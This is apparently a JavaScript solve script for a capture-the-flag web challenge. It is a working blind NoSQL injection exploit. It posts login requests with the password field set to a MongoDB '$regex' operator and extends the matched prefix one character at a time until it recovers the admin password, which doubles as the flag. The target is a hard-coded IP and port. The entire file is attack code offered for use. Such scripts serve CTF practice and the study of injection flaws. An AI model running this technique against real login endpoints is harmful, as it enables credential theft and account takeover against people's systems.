// https://dev.to/nulldreams/beware-of-the-findone-function-15g

// local_payload = {
//     "username":"admin",
//     "password":"CHTB{f4k3_fl4g_f0r_t3st1ng}"
// }

url = "http://139.59.174.238:32605"
// url = "http://localhost:1337";

charlist = "_}0123456789abcdefghijklmnopqrstuvwxyz";
num_chars = charlist.length;
first_prefix = "CHTB{";

function get_next_char(ch) {
    pos = charlist.indexOf(ch)
    if (pos+1 >= num_chars) {
        return ""
    } else {
        return charlist.charAt(pos+1)
    }
}

function next_test(prefix) {

    for (i = 0; i < num_chars; i++) {
        next_char = charlist[i];
        next_pass = prefix + next_char;
        payload = {
            "username": "admin",
            "password": {"$regex": next_pass}
        }
        // console.log(JSON.stringify(payload));
        try_password(payload, next_pass, next_char);
    }
    
}

async function try_password(payload, pwd, char) {
    require('node-fetch')(url + "/api/login", {
        "headers": {
          "content-type": "application/json;charset=UTF-8"
        },
        "referrer": "http://localhost:1337/",
        "referrerPolicy": "strict-origin-when-cross-origin",
        "body": JSON.stringify(payload),
        "method": "POST",
        "mode": "cors"
    })
    .then((response) => response.text())
    .then((text) => {
        result = JSON.parse(text)
        if (result.logged == 1) {
            console.log("\n\n\nWIN: " + result.message + " -> " + pwd);

            if (char == "}") {
                console.log("\n\nPASSWORD FOUND!!!: " + pwd);
            } else {
                next_test(pwd);
            }
            
        } else {
            // console.log("LOSS: " + result.message);

            // next_char = get_next_char(char)
            // if (next_char == "") {
            //     console.log("Complete Password Not Found :(");
            // } else {
            //     next_test(prefix, next_char);
            // }
        }
    });
}

next_test(first_prefix)